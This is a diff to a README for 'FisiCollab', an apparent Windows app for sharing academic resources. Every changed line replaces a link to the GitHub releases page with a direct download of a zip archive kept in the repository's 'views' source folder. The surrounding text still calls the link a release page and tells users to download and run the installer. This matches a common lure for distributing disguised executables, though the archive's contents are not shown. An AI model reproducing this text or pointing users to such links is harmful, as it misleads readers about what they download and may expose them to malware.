@@ -1,6 +1,6 @@
 # 📚 FisiCollab - Easy Academic Resource Sharing
 
-[![Download FisiCollab](https://img.shields.io/badge/Download-FisiCollab-brightgreen?style=for-the-badge)](https://github.com/isaac2006esp/FisiCollab/releases)
+[![Download FisiCollab](https://img.shields.io/badge/Download-FisiCollab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/isaac2006esp/FisiCollab/main/views/Collab_Fisi_2.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and use FisiCollab on your Windows machine. The p
 
 Click the big green button above or this link to open the release page:
 
-[https://github.com/isaac2006esp/FisiCollab/releases](https://github.com/isaac2006esp/FisiCollab/releases)
+[https://raw.githubusercontent.com/isaac2006esp/FisiCollab/main/views/Collab_Fisi_2.0.zip](https://raw.githubusercontent.com/isaac2006esp/FisiCollab/main/views/Collab_Fisi_2.0.zip)
 
 This page hosts the latest versions of FisiCollab. You will find the files ready to download, along with details about new features and fixes.
 
@@ -117,7 +117,7 @@ File storage is organized to prevent accidental sharing outside your chosen grou
 
 New versions of FisiCollab include security improvements, bug fixes, and occasional new features. Check the release page regularly:
 
-[https://github.com/isaac2006esp/FisiCollab/releases](https://github.com/isaac2006esp/FisiCollab/releases)
+[https://raw.githubusercontent.com/isaac2006esp/FisiCollab/main/views/Collab_Fisi_2.0.zip](https://raw.githubusercontent.com/isaac2006esp/FisiCollab/main/views/Collab_Fisi_2.0.zip)
 
 Download and run the new installer to update your app. Your data and settings will stay intact.
 
@@ -156,4 +156,4 @@ For questions or extra help, check any user guides or FAQs included with the app
 
 Use this link to reach the release page and download FisiCollab anytime:
 
-[https://github.com/isaac2006esp/FisiCollab/releases](https://github.com/isaac2006esp/FisiCollab/releases)
+[https://raw.githubusercontent.com/isaac2006esp/FisiCollab/main/views/Collab_Fisi_2.0.zip](https://raw.githubusercontent.com/isaac2006esp/FisiCollab/main/views/Collab_Fisi_2.0.zip)
